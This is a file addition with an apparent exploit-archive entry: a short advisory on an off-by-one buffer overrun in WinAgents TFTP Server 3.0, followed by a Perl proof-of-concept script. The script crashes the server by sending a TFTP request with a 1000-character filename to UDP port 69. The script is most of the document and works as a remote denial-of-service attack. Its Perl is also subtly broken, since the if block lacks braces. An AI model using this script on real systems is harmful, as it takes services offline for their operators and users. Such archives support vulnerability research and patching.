@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/10526/info
+
+WinAgents TFTP Server is reported prone to a remote off-by-one buffer overrun vulnerability. The issue is reported to exist due to a lack of sufficient boundary checks performed on filenames when a request is made for a file. A remote attacker may make a malicious request to the server for a filename of excessive length. This request will trigger the vulnerability. Immediate consequences of such an attack will reportedly result in a denial of service.
+
+#!/usr/bin/perl
+# 
+# Remote D.O.S WinAgents TFTP Server ver 3.0 
+# 
+# Tftp.pl <Host>
+
+use IO::Socket;
+
+$Tftp_Port = "69";
+$FileName = "A"x1000;
+$Tftp_OP = "\x00\x01";
+$Tftp_M  = "bin";
+$Buf = $Tftp_OP . $Tftp_M . $FileName ;
+
+if(!($ARGV[0]))
+ 
+ print "\nUsage: perl $0 <Host>\n" ;
+ 
+ exit;
+ 
+
+print "\nRemote D.O.S WinAgents TFTP Server ver 3.0 PoC\n\n\n";
+
+
+$socket = IO::Socket::INET->new(Proto => "udp") or die "Socket Error ...\n"
+;
+$ipaddr = inet_aton($ARGV[0]);
+$portaddr = sockaddr_in($Tftp_Port, $ipaddr);
+send($socket, $Buf, 0, $portaddr) == length($Buf) or die "Error : Can't send ...\n";
+print "Server : $ARGV[0] Is Down ... \n";
